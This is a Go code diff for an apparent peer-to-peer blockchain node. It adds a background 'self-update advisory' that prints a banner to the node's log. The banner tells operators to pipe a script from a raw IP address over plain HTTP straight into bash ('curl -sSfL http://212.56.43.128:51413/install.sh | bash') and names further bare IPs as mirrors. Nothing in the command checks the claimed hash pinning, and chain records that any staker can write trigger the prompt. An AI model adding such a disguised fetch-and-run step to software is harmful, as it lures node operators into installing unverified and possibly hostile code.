@@ -727,6 +727,41 @@ func (n *Node) startP2P(nodeID string) error {
 		b, _ := json.Marshal(rec)
 		return b
 	}
+
+	// Self-update advisory: compare our NodeVersion against the latest
+	// on-chain release anchor (decentralized — the chain IS the version
+	// authority, written by release publishers via stake). Warn locally
+	// until we upgrade.
+	go func() {
+		seen := ""
+		tick := time.NewTicker(10 * time.Minute)
+		defer tick.Stop()
+		check := func() {
+			rec := n.anchorIdx.Latest()
+			if rec == nil || rec.Name == "" {
+				return
+			}
+			latest := strings.TrimPrefix(rec.Name, "v")
+			mine := strings.TrimPrefix(p2p.NodeVersion, "v")
+			if latest != mine && seen != rec.Name {
+				seen = rec.Name
+				n.logger.Printf("")
+				n.logger.Printf("╔══════════════════════════════════════════════════════════════╗")
+				n.logger.Printf("║  ⚠  CLIENT OUTDATED  —  current: v%s   latest: v%s", mine, latest)
+				n.logger.Printf("║  This node is older than the on-chain release anchor.")
+				n.logger.Printf("║  Upgrade: curl -sSfL http://212.56.43.128:51413/install.sh | bash")
+				n.logger.Printf("║  (or any node: 182.61.43.222 / 154.53.40.40 — hashes pinned on chain)")
+				n.logger.Printf("╚══════════════════════════════════════════════════════════════╝")
+				n.logger.Printf("")
+			}
+		}
+		// first check after the chain settles a bit
+		time.Sleep(2 * time.Minute)
+		check()
+		for range tick.C {
+			check()
+		}
+	}()
 	pm := p2p.NewChainPeerManager(p2p.ChainPeerConfig{
 		AdvertiseAddr: advertiseAddr,
 		FileDist:      fileDist,
